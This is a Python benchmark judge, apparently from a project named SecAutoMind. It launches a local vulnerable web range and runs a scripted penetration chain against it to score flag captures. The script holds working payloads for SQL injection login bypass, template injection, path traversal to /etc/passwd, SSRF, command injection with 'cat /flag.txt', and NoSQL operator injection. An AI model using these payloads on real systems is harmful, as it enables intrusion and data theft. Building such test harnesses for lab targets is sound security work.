#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Web 实战基准集判定器（Python 侧，与 Go web_exploit.go 互为镜像）

纪律：SecAutoMind 的任何能力宣称必须**双语言机验**——Go 侧
（internal/ctfplatform/web_exploit.go + TestWebExploitAgainstRange）与 Python 侧
（本文件）必须跑出一致的命中率，任一侧漂移立即暴露。

判定方式：起真实靶场（live_target/web_range.py），用纯 stdlib urllib 复刻
同一套渗透链，把拿到的 flag 与 web_benchmark.json 里的 flag_sha256 逐一比对。
flag 只有在利用成功时靶场才会返回，杜绝"关键词猜中"。
"""
import base64
import hashlib
import json
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from http.client import HTTPConnection

HERE = os.path.dirname(os.path.abspath(__file__))
RANGE_PY = os.path.join(HERE, "live_target", "web_range.py")
BENCH = os.environ.get("WEB_BENCH", os.path.join(HERE, "web_benchmark.json"))
PORT = int(os.environ.get("WEB_PORT", "18094"))

FLAG_RE = re.compile(r"(?:flag|FLAG|picoCTF|ctf)\{[^}]{3,80}\}", re.I)
B64_RE = re.compile(r"[A-Za-z0-9+/]{12,}={0,2}")
COMMENT_RE = re.compile(r"<!--(.*?)-->", re.S)


def sh(s: str) -> str:
    return hashlib.sha256(s.encode()).hexdigest()


def scan_flags(text: str):
    return FLAG_RE.findall(text or "")


def b64_decode_all(text: str):
    out = []
    for tok in set(B64_RE.findall(text or "")):
        if len(tok) % 4:
            continue
        try:
            raw = base64.b64decode(tok)
        except Exception:
            continue
        if not raw:
            continue
        printable = sum(1 for c in raw if 0x20 <= c < 0x7F)
        if printable / len(raw) < 0.9:
            continue
        out.append(raw.decode("utf-8", "ignore"))
    return out


def fetch(url: str, data: bytes = None, ctype: str = None, timeout: float = 5.0):
    """返回 (status, body_text, headers)。失败返回 (0, '', {})。"""
    try:
        req = urllib.request.Request(url, data=data, method="POST" if data is not None else "GET")
        req.add_header("User-Agent", "SecAutoMind-WebJudge/1.0")
        if ctype:
            req.add_header("Content-Type", ctype)
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "ignore"), dict(r.headers)
    except urllib.error.HTTPError as e:
        try:
            body = e.read().decode("utf-8", "ignore")
        except Exception:
            body = ""
        return e.code, body, dict(e.headers or {})
    except Exception:
        return 0, "", {}


def passive(scene, out, body, headers):
    """被动扫描：正文 / 注释 / 隐藏域 / base64 / Set-Cookie。"""
    for f in scan_flags(body):
        out[sh(f)] = (scene, f)
    for c in COMMENT_RE.findall(body or ""):
        for f in scan_flags(c):
            out[sh(f)] = (scene + "_comment", f)
        for dec in b64_decode_all(c):
            for f in scan_flags(dec):
                out[sh(f)] = (scene + "_b64", f)
    for dec in b64_decode_all(body or ""):
        for f in scan_flags(dec):
            out[sh(f)] = (scene + "_b64", f)
    for key in ("Set-Cookie", "set-cookie"):
        v = headers.get(key, "")
        if not v:
            continue
        for f in scan_flags(v):
            out[sh(f)] = ("cookie_flag", f)
        for dec in b64_decode_all(v):
            for f in scan_flags(dec):
                out[sh(f)] = ("cookie_flag", f)


def exploit(base: str):
    """复刻 Go ExploitWebTarget 的渗透链。"""
    found = {}  # sha -> (scene, flag)

    # 1. 资产发现
    for p in ["/", "/index.php", "/login", "/source", "/b64", "/cookie",
              "/api/v1/secret", "/admin", "/robots.txt", "/page", "/cmd", "/fetch"]:
        st, body, hdr = fetch(base + p)
        if st:
            passive("open_page", found, body, hdr)

    # 2. SQL 注入登录绕过
    for pl in ["admin' OR '1'='1", "admin' OR 1=1--", "' OR '1'='1' --",
               "admin'--", "' OR 1=1#", "admin' /*", "' or 'a'='a"]:
        for ep in ["/login", "/"]:
            form = urllib.parse.urlencode({"user": pl, "username": pl,
                                           "pass": "x", "password": "x"}).encode()
            st, body, hdr = fetch(base + ep, data=form,
                                  ctype="application/x-www-form-urlencoded")
            if st:
                passive("sqli_login", found, body, hdr)
            st, body, hdr = fetch(base + ep + "?user=" + urllib.parse.quote(pl) + "&pass=x")
            if st:
                passive("sqli_login", found, body, hdr)

    # 3. SSTI 探测 + 提权
    for param in ["name", "q", "input", "text", "msg"]:
        st, body, _ = fetch(base + "/ssti?" + param + "=" + urllib.parse.quote("{{7*7}}"))
        if st and "49" in body:
            for payload in ["{{flag()}}", "{{config.FLAG}}"]:
                st2, b2, h2 = fetch(base + "/ssti?" + param + "=" + urllib.parse.quote(payload))
                if st2:
                    passive("ssti", found, b2, h2)

    # 4. LFI / 路径遍历
    for param in ["file", "page", "path", "template", "doc"]:
        for payload in ["../../../../etc/passwd", "flag.txt", "../flag.txt",
                        "/etc/passwd", "....//....//flag.txt"]:
            for ep in ["/page", "/"]:
                st, body, hdr = fetch(base + ep + "?" + param + "=" + urllib.parse.quote(payload))
                if st:
                    passive("lfi", found, body, hdr)

    # 5. SSRF
    for param in ["url", "uri", "target", "fetch", "link"]:
        for inner in ["/admin", "http://127.0.0.1/admin", base + "/admin"]:
            target = base + inner if inner.startswith("/") else inner
            st, body, hdr = fetch(base + "/fetch?" + param + "=" + urllib.parse.quote(target))
            if st:
                passive("ssrf", found, body, hdr)

    # 6. 命令注入
    for param in ["ip", "cmd", "host", "ping"]:
        for payload in ["127.0.0.1;cat /flag.txt", "127.0.0.1;cat /flag",
                        "127.0.0.1|cat /flag.txt", "127.0.0.1 && cat /flag.txt"]:
            st, body, hdr = fetch(base + "/cmd?" + param + "=" + urllib.parse.quote(payload))
            if st:
                passive("cmdi", found, body, hdr)

    # 7. NoSQL 运算符注入
    for payload in ['{"user":{"$ne":""},"pass":{"$ne":""}}',
                    '{"username":{"$ne":null},"password":{"$ne":null}}',
                    '{"user":"admin","pass":{"$gt":""}}',
                    '{"": ""}']:
        for ep in ["/nosql", "/login", "/api/login"]:
            st, body, hdr = fetch(base + ep, data=payload.encode(), ctype="application/json")
            if st:
                passive("nosql", found, body, hdr)
    return found


def wait_ready(port, timeout=10.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            c = HTTPConnection("127.0.0.1", port, timeout=1)
            c.request("GET", "/")
            c.getresponse().read()
            c.close()
            return True
        except Exception:
            time.sleep(0.1)
    return False


def main():
    bench = json.load(open(BENCH, encoding="utf-8"))["problems"]
    proc = subprocess.Popen([sys.executable, RANGE_PY, str(PORT)],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        if not wait_ready(PORT):
            print("靶场未就绪")
            return 1
        found = exploit("http://127.0.0.1:%d" % PORT)
        hits = 0
        for scene, p in bench.items():
            if p["flag_sha256"] in found:
                hits += 1
                print("✅ HIT  %-12s -> %s" % (scene, found[p["flag_sha256"]][1]))
            else:
                print("❌ MISS %-12s" % scene)
        total = len(bench)
        print("=== [Python] Web 实战命中率: %d/%d = %.1f%% ===" % (hits, total, 100 * hits / total))
        return 0 if hits == total else 1
    finally:
        proc.kill()


if __name__ == "__main__":
    sys.exit(main())
